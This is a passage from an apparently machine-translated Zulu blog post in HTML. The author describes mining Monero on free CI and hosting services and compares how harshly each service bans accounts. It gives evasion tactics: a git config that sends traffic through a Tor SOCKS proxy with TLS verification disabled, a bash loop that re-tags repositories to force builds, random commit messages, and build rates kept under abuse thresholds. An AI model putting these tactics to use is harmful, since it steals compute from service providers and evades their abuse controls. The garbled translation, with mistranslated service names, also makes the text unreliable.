style=text-align:center>ban-isando<tr><td style=text-align:center>IBitrise<td style=color:red;text-align:center>kubi<td style=color:#ff0;text-align:center>okulingene<td style=color:#ff0;text-align:center>okulingene<tr><td style=text-align:center>UTravis<td style=color:green;text-align:center>kuhle<td style=color:#ff0;text-align:center>okulingene<td style=color:green;text-align:center>kuhle<tr><td style=text-align:center>Amakhodi<td style=color:#ff0;text-align:center>okulingene<td style=color:red;text-align:center>kubi<td style=color:#ff0;text-align:center>okulingene<tr><td style=text-align:center>IGitlab<td style=color:#ff0;text-align:center>okulingene<td style=color:green;text-align:center>kuhle<td style=color:green;text-align:center>kuhle<tr><td style=text-align:center>Circleci<td style=color:red;text-align:center>kubi<td style=color:green;text-align:center>kuhle<td style=color:#ff0;text-align:center>okulingene<tr><td style=text-align:center>Semaphore<td style=color:green;text-align:center>kuhle<td style=color:green;text-align:center>kuhle<td style=color:#ff0;text-align:center>okulingene<tr><td style=text-align:center>Idokodo<td style=color:#ff0;text-align:center>okulingene<td style=color:#ff0;text-align:center>okulingene<td style=color:green;text-align:center>kuhle<tr><td style=text-align:center>Quay<td style=color:green;text-align:center>kuhle<td style=color:#ff0;text-align:center>okulingene<td style=color:#ff0;text-align:center>okulingene<tr><td style=text-align:center>Ikhodi entsha<td style=color:red;text-align:center>kubi<td style=color:green;text-align:center>kuhle<td style=color:#ff0;text-align:center>okulingene<tr><td style=text-align:center>Wercker<td style=color:#ff0;text-align:center>okulingene<td style=color:#ff0;text-align:center>okulingene<td style=color:red;text-align:center>kubi<tr><td style=text-align:center>Amapayipi we-Azure<td style=color:#ff0;text-align:center>okulingene<td style=color:#ff0;text-align:center>okulingene<td style=color:red;text-align:center>kubi<tr><td style=text-align:center>Ukuqhubeka<td style=color:red;text-align:center>kubi<td style=color:#ff0;text-align:center>okulingene<td style=color:#ff0;text-align:center>okulingene<tr><td style=text-align:center>Umngane<td style=color:red;text-align:center>kubi<td style=color:red;text-align:center>kubi<td style=color:red;text-align:center>kubi<tr><td style=text-align:center>UDrone<td style=color:red;text-align:center>kubi<td style=color:green;text-align:center>kuhle<td style=color:red;text-align:center>kubi<tr><td style=text-align:center>Umethuli<td style=color:red;text-align:center>kubi<td style=color:#ff0;text-align:center>okulingene<td style=color:red;text-align:center>kubi<tr><td style=text-align:center>Ungalokothi ufake ikhodi<td style=color:red;text-align:center>kubi<td style=color:green;text-align:center>kuhle<td style=color:#ff0;text-align:center>okulingene<tr><td style=text-align:center>I-Zeist / i-vercel<td style=color:red;text-align:center>kubi<td style=color:green;text-align:center>kuhle<td style=color:red;text-align:center>kubi</table><p>Kulo mongo, a<span style=color:green> kuhle</span> ukumiswa kusho ukuthi akuthathanga isikhathi esiningi ukumisa i-<code>ci</code> umsebenzi wenqubo yezimayini (njengazo zonke izinsizakalo ezithembele kudeshibhodi yewebhu esikhundleni sefayela lamachashaza okugcina kwakungumsebenzi), a<span style=color:red> kubi</span><code>ban-hammer</code> kusho ukuthi bekunzima ukubhalisela insizakalo, noma ukuthi ama-akhawunti azovinjelwa ngolaka.<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> IBitrise</a> kudinga ukusetha iphrojekthi, ukufaka imvelo, ukwakheka okuhlosiwe, inqubo yokwenza nezinye izinto, bekudla isikhathi esiningi ukusetha ukwakhiwa ngakho kuthola isilinganiso esibi ekucushweni.<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> Ukuqhubeka</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> Umngane</a> , [I-Codefresh] ibuye ibe nezinyathelo eziningi zokumisa ezingamemezeli.<p>Izinsizakalo ezinjenge- [Azure-pipipes],<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> Wercker</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> Umngane</a> kusebenza ukuvinjelwa komthunzi kuma-akhawunti, ukuvinjelwa kwethunzi kubi, njengoba kukushiya uqagela ukuthi ngabe kukhona okungahambi kahle ngokulungiswa kwakho noma cha. Ngezinsizakalo ezithile ungaqagela isizathu sokuvinjelwa (ukwakhiwa kwakho kuthathe isikhathi esiningi kakhulu, noma wakha kaningi kakhulu esikhathini esifushane), kwabanye abanye njengama- [Azure-pipipes] ngicabanga ukuthi basebenzise uhlobo oluthile lwezigxivizo zeminwe kumakhosombe omsebenzisi njengoba ukuvinjelwa bekuqhamuka ngaphandle kokuhlukumezeka kwezinsizakusebenza, i-azure ne-vercel nakho kuvinjelwe<code>DNS</code> ukufinyelela ngaphakathi kwemishini yokwakha yomphakathi, ngakho-ke lokho kwaba ukungqubuzana okwengeziwe okwakudinga ukunqotshwa ngomhubhe we-ad-hoc.<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> UDrone</a> inikeze ukufinyelela ku-processor engu-16 + cores kodwa yagcina ukuvinjelwa ngemuva kokwakhiwa okungu-2<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> Amakhodi</a> futhi inika ukufinyelela kubabusi abanamandla bokwakha futhi abavimbanga ngolaka njenge-drone.<p>Izinsizakalo engizithandayo hhayi ngenxa yenzuzo kepha ukwenzelwa lula nokusebenziseka kalula (futhi namanye amaphrojekthi) zazikhona<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> UTravis</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> Semaphore</a> futhi<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> I-Docker-hub</a> . UTravis ufana neCI ejwayelekile futhi uguquguquka kakhulu, uSemaphore ukuphela kwakhe<code>DSL</code> ngoba<code>CI</code> lokho bekubukeka kuyangeneka futhi kuhle kepha esikhundleni sokulandelana okungapheli kwamabhokisi wokuhlola anezinhlaka njengamanye ama-UIs, ne-Docker ukuze kube lula ukwenza imephu yama-dockerfiles ezokwakhiwa.<h3 id=builds_configs><a class=header-anchor href=#builds_configs> Yakha ama-configs</a></h3><p>Ukwakhiwa kudalwe yimisebenzi ye-cron enikezwa ngamasevisi wewebhu noma nge-git commits. Ngakho-ke bekufanele ulandele ukulahlwa kwamathokheni wokufinyelela noma okhiye be-ssh ukuphatha konke ukwenza kwe-git. Kwakubalulekile futhi ukungasebenzisi okweqile kogaxekile, futhi usebenzise ama-proxies lapho ucindezela kokugcina okulungiselela i-git:<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>Kusetshenziswa izinsizakalo zokubamba i-git, i-github ibilokhu ihlose kakhulu ngokuvinjelwa, kepha babulawa kuphela emibikweni yokuhlukunyezwa ngabaphathi bezinsizakalo ze-ci, i-gitlab yenze igagasi lokuvinjelwa kanye, lapho ngangizama ukuvuselela isilingo se-CI (ngokunganaki). Angikaze ngithole ukuvinjelwa kwe-akhawunti ye-bitbucket. Ukuphoqa (ukuphoqa) ukwenza i-git commits, sineluphu ende egijima emaka kabusha indawo yokugcina ye-git:<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(ls -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span>
        sleep <span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span>
    sleep 1
<span class=hljs-keyword>done</span></code></pre><p>Kungenzeka ukuthi ukuphoqa ngale ndlela akuyona into ethandwa kakhulu yi-github futhi bekungaba imbangela yokuthi ama-akhawunti ahlatshwe umkhosi. Umsebenzi we-tagger onikezwe amandla wokucindezela ukwenza okwehlukile, usebenzisa iwebhusayithi (ongayibheka kalula) enikeza ukwenza okuthile okungahleliwe. Angiqiniseki ukuthi lokhu kusiza kangakanani, ngoba okuqukethwe uqobo lwazo kuyasolisa ngecala lami. Futhi kwangiluma imbongolo kanye, ngoba izithembiso ezibuyiswe yilo myalo zingafaka amagama athukayo, okunye kokuzibophezela kwami ​​kwathathwa yi-twitter bot elandelela i-git commits ngamazwi athukayo! Ngingeze uhlu lwamagama abamnyama ngamagama amabi ngemuva kwalesi sigameko.<p>Angikaze ngingene kakhulu kwizivumelwano ze-git ezithintekayo nezinqolobane ze-git ezifakiwe. Okuwukuphela kwesimo lapho bengisebenzisa khona indawo ebanzi kakhulu bekuneBitrise ngoba awukwazanga ukusetha ukwakhiwa uma uhlelo lungaboni indawo (njengezinhlelo zokusebenza zeselula), kepha noma kunjalo bekungekho ukujikeleza futhi bekuhlala kufana okugcina, kulula ukubona.<p>Sekukonke, ukube bekufanele ngihlele ijika lensimbi elizungeze isikhathi esifanelekile esami<em> ngaphandle</em>ukuthola ama-akhawunti avinjelwe, kuzo zonke izinsizakalo ezivivinyiwe, kuzoba nesikhungo cishe isikhathi se-1 sokwakha ihora, kanye ngosuku. Okwezinhlamvu ze-cpu, ngaphandle kwabamangaleli abambalwa (njenge-drone), izinsizakalo eziningi zilindele ukuthi usebenzise inani eligcwele lezinsizakusebenza ozinikezwe ngoba ukwakhiwa kwenziwa ngaphakathi kwama-VM noma iziqukathi ezinezinsizakusebenza ezibekiwe ... futhi ukuhlanganiswa ngokuvamile kungumsebenzi igcwalisa i-cpu, ngakho-ke ayinakho ukubaluleka kwezibalo. Ngokuzenzakalelayo ukwakhiwa okukodwa ngosuku yilokho umakhi ojwayelekile azokwenza, ngakho-ke kufanele ulindele amafulegi aphakanyisiwe uma unhlanhlatha kude nencazelo, futhi ukuphokophela ukuhlukunyezwa akupheli kahle.<h2 id=conclusions><a class=header-anchor href=#conclusions> Iziphetho</a></h2><p>Ingabe bekufanele? Izingxenye zokuxhumana zazithandeka impela, ukubhekana nokubhaliswa kwama-akhawunti kusobala ukuthi kwakuyingxenye embi kunazo zonke, akukho nobody othanda ukuchofoza ama-imeyili okuqinisekisa angapheli nokuphinda izinqubo ze-UI zokuphazamisa ingqondo, phela. Ukubhala isoftware ezenzekelayo nakho kuyisicefe (ngoba ukukha kwakho ama-API ayizimungulu kakhulu), nangalokhu kucabanga (nokuthi lokhu akukaze kube yinto ebucayi) angikaze ngikucabangele. Ingabe kwakuzuzisa? Ekuphakameni kwayo bekufinyelela okuthile okufana nalokhu<code>300$</code> ngenyanga, mhlawumbe yanele i-venezuelan, hhayi mina uqobo :)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> i-sysadmin ekhathazayo</em></table><table class=fndef id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>noma lokhu kungaphula ukucabanga okuningi kwangasese, ngiyaqiniseka ukuthi iningi labo limane libheke ngaphakathi noma kunini lapho kunenkinga ekhona, kepha lokhu kuyinkinga yesikhathi sokusebenza esisekelwe esitsheni, kanti ama-VM angamabhokisi amnyama kakhulu.</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>umvukuzi owakhelwe ngaphakathi kwe-monero node wathola umsebenzi othile ukuze akwenze kube nobungane ngemuva, kepha ukusatshalaliswa kwe-xmrig akukaze kugxilwe kubungani obungemuva.</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>amanye amachibi ahlinzeka ubunzima obuhlukile emachwebeni ahlukahlukene wokuxhuma, futhi athambekele ekuqondiseni ubunzima bomsebenzi kumvukuzi ohambise amasheya, kepha ubukhulu bommeleli bebusalula kakhulu, ngoba bungavimbela ichibi<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> ukukhiya</a> (yize singakaze sishintshe amachibi).</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>bekungajabuli lapho i-config ivele ngokuzumayo futhi inyamalala ohlelweni lwefayela</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>Asikhulumi nge<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> umthetho olandelwayo we-stratum</a> ngoba kufanele sibhekane nanoma yini esetshenziswayo<em> Kokubili</em> ichibi nomvukuzi ... okuvame ukuba ubuncane obungenalutho, futhi ngokunokwenzeka ngezandiso ezingejwayelekile.</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>ungalokothi uhambe ngokugcwele bash :)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>Angizange ngihlole okwenzekayo lapho izinqubo zilayisha ukusebenza okwengeziwe ngesikhathi sokusebenza, njengoba i-kernel ibizobheka ikheli ekuhlelweni kwememori ye-executable, ezokwazi ukufinyelela isistimu yefayela futhi mhlawumbe ibangele ukuphahlazeka.</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>Imikhawulo ayinangqondo, isikhathi se-cpu singaphansi komzuzwana, imemori ingaphansi kwe-128M, ukuxhumana okuphumayo kuvinjiwe.</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>ngokubekezela okuncane futhi ungasebenzisa isibonelo esigcwele se-ssh ngaphezulu kwendawo eboshwe ngebhokisi ezungeze isikhala se-akhawunti yakho ye-cpanel,<em> ngaphandle</em> ukufinyelela i-cpanel builtin SSH evame ukukhubazeka ngokunikela abahlinzeki.</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>I-openhift isuke esigabeni samahhala sonyaka ongu-1 yaya ezinyangeni ezi-3 yaya enyangeni engu-1, iqala ukudinga ukuqinisekiswa kwefoni, ngingaqinisekisa ukuthi bekungeyimi ngedwa ohlukumeza izinsizakalo zabo.</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>Iziqukathi zeHeroku zamahhala zinikela kakhulu ngezinsizakusebenza, zinikela nge-4c / 8t (virtual) cpus, inqwaba yenqama nesitoreji esikhulu (nokho esingaphikisi futhi esilahliwe ekucinyweni kwe-dyno).</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>Bafaka imithetho yokubhaliswa kwe-muc strictier, ngemuva kokuvinjelwa okumbalwa, kungenzeka ngibe nomthelela kukho.</table><p><div id=post-tags-list>Thumela Amathegi: <span class=post-tag><a href=https://www.unto.re/tag/crypto> i-crypto</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/net> inetha</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/shell> igobolondo</a></span></div><div class=page-foot><div class=copyright>Agasti 21, 2021</div><script async crossorigin=anonymous issue-term=pathname label=Comment repo=untoreh/untoreh.github.io src=https://utteranc.es/client.js></script></div></div><div class=page__footer><footer><div class=page__footer-copyright>© untoreh - Inikwe amandla yi<a href=https://github.com/tlienart/Franklin.jl> UFranklin</a></div><div class=page__footer-links>- <ul><li><a href=/zu/sitemapxml> Ibalazwe</a></li> | <li><a href=/zu/tag> Amathegi</a></li> | <li><a href=https://www.unto.re/tag/feed.xml> I-RSS</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></ul></footer></div><script crossorigin=anonymous defer id=fa integrity=sha384-DJ25uNYET2XCl5ZF++U8eNxPWqcKohUUBUpKGlNLMchM7q4Wjg2CUpjHLaL8yYPH src=https://use.fontawesome.com/releases/v5.8.2/js/all.js></script><script src=/libs/colors.js></script><script src=/libs/menu.js></script><script defer src=/libs/lunr/lunr.min.js></script>